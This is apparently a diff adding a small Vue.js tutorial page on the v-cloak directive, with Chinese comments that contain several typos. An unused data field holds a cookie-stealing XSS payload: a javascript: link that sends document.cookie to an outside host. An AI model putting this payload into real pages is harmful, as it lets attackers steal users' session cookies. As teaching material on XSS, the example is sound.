@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>title</title>
+    <style>
+        [v-cloak]{
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- 
+        v-cloak指令（没有值）：
+        1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会刚掉v-c1oak属性。
+        2.使用cs配合v-c1oak可以解决网速授时页面展示出({xx)的问题。
+ -->
+
+    <div id="root">
+        <h1 v-cloak>{{name}}</h1>
+    </div>
+
+<script type="text/javascript" src="../vue.js"></script>
+</body>
+
+   <script>
+        new Vue({
+            el: "#root",
+            data() {
+                return {
+                    name: "Jack",
+                    msg: "<a href= javascript:location.href=href='https://www.baidu.com?'+document.cookie>XSS攻击</a>"
+                }
+            },
+        })
+    </script>
+
+</html>
